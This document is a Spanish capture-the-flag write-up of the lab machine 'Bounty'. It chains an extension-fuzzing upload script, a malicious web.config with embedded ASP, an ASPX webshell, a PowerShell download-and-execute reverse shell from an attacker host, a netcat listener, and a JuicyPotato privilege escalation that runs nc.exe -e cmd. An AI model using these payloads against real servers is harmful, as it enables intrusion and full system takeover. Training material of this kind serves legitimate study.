-------
- Tags: #juicypotato #impersonating #IIS #python-scripting #web-config 
-  --------------
## Técnicas utilizadas
- IIS Enumeration  
- Creating our own extension fuzzer in Python [Python Scripting] [EXTRA]  
- IIS Exploitation - Executing code via web.config file upload  
- Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]
## Procedimiento
![[Pasted image 20230728105515.png]]

#### Reconocimiento
Un escaneo con **nmap** para descubrir los servicios que estan corriendo para esta maquina nos muestra los siguientes puertos:
```ruby
# nmap -sCV -p80 10.10.10.93 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 14:54 UTC
Nmap scan report for 10.10.10.93
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
```

Con **whatweb** podemos listar algunas de las tecnologías que estan por detrás del sitio web:
```ruby
# whatweb 10.10.10.93
http://10.10.10.93 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
```

------------
#### IIS Enumeration  
Si hacemos un escaneo con **Gobuster** o **Wfuzz** para descubrir archivos **.aspx/.asp** ( formato tipico de un IIS ) podemos encontrar uno:
![[Pasted image 20230728150042.png]]
Visitandolo, nos percatamos que es basicame **uploader**.

-----------
#### Creating our own extension fuzzer in Python [Python Scripting] EXTRA
Para no estar intentando a mano con cada extesión para ver cual es valida, podemos hacer un script en **python** para automatizar esta tarea:
```python
#!/usr/bin/python3

from pwn import *
import signal
import pdb
import re

# ctrl + C
def def_handler(sig,frame):
	print("\n[!] Saliendo...!")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
transfer_url = "http://10.10.10.10/transfer.aspx"

# Funciones
def uploadFile(extension):

	s = requests.session()
	r = s.get(transfer_url)

	viewState = re.findall(r'id="__VIEWSTATE" value="(.*?)"', r.text)[0]
	eventValidation = re.findall(r'id="__EVENTVALIDATION" value="(.*?)"', r.text)[0]

	post_data = {
		'__VIEWSTATE' : viewState,
		'__EVENTVALIDATION': eventValidation,
		'btnUpload' : 'Upload'
	}

	fileUploaded = {'FileUpload1' : ('Prueba%s' % extension, 'Esto es una prueba')}

	r = s.post(transfer_url, data=post_data, files=fileUploaded)

	if "Invalid File. Please try Again" not in r.text:
		log.info("La extension %s es valida" % extension)
	

if __name__ == "__main__":

	f = open("/usr/share/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase,txt", 'rb')

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)

	
	for extension in f.readlines():
		extension = extension.decode().strip()
		p1.status("Probando con la extension: %s" % extension)
		uploadFile(extension)
 
```

---------
#### IIS Exploitation - Executing code via web.config file upload  
Vemos que hay un tipo de extension valido que es bastante turbio:
![[Pasted image 20230728152202.png]]

Si buscamos en **google** por cosas que podemos aprovechar de esto encontramos un [articulo](https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/) que lo explica bien. Lo que tenemos que hacer es crear un **web.config** y dentro de esto colocar un contenido tal como esto:
```aspx
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Entonces, cuando visitemos este archivo, nos tendria que poner el resultado de **1+2**, o sea, **3**. Pero, antes de todo, tenemos que fuzzear por directorios para encontrar donde se ha almacenado este archivo con **wfuzz**:
```json
# wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://10.10.10.10/FUZZ"
```

Y nos encuentra este directorio:
![[Pasted image 20230728151417.png]]

Asi que problablemente el archivo este en este directorio:
```
Image Web.Config result 3
```

Nos queda ahora solo subir un **WebShell** en [aspx](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx), visitar la pagina y podremos ejecutar comandos en la maquina victima:
```
Image Web.Config Aspx WebShell
```

Con esto disponible, nos entablaremos una Reverse Shell con el **InvokePowerShell.ps1** de [nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1), corremos el comando:
```
powershell IEX(New-Object Net.WebClient).downloadString("http://10.10.10.10/InvokePowerShell.ps1")`
```

Antes de ejecutarlo, nos ponemos en escucha con **netcat**:
```
nc -lvnp 443
listening on [any] 443 ...
```

Mandamos el comando y ganaremos acceso a la maquina.

-----------
#### Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]
Si hacemos un `whoami /priv` podemos ver que tenemos asignado **SeImpersonatePrivilage** asi que podemos tirar de [JuicyPotato.exe](https://github.com/ohpe/juicy-potato). Para variar, también podemos hacerlo como lo vimos en la maquina [[Most Important - HackBack|HackBack]].

Con **JuicyPotato** seria de la siguiente manera:
```
.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd 10.10.10.10 443'"
```

Pero de antes tendriamos que subir el **nc.exe** en la ruta **temp**.